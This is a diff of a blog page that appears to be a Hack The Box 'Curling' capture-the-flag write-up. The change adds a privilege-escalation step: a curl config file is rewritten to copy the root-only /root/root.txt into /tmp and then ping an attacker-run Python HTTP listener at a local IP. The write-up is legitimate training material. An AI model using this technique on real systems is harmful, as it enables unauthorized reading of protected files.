@@ -276,14 +276,25 @@ url <span class="o">=</span> <span class="s2">"http://127.0.0.1"</span>
 
 <p>Given this output, you can relate to curl <code class="highlighter-rouge">--config</code> flag. Thus, you can rewrite that file as follow:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url <span class="o">=</span> <span class="s2">"file:/root/root.txt"</span>
-<span class="nt">-o</span> /tmp/root.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># To get "ping" when the file has been fetched</span>
+<span class="nb">local</span><span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 1234
 </code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># On the remote  server</span>
+url <span class="o">=</span> <span class="s2">"file:/root/root.txt"</span>
+<span class="nt">-o</span> /tmp/root.txt
+url <span class="o">=</span> <span class="s2">"http://&lt;local_IP&gt;:1234"</span>
+</code></pre></div></div>
+
+<p>When you receive a GET request from the RHOST you know you can read the new <code class="highlighter-rouge">root.txt</code> file located in <code class="highlighter-rouge">/tmp</code>. w00t! ;)</p>
 
 
   <h2>Latest Posts</h2>
 
   <ul class="post-list">
+    
+      - <a href="/offsec/2018/11/25/HTB-vault.html"> Htb Vault</a>
+      <br>
     
       - <a href="/offsec/2018/11/13/HTB-curling.html"> Htb Curling</a>
       <br>
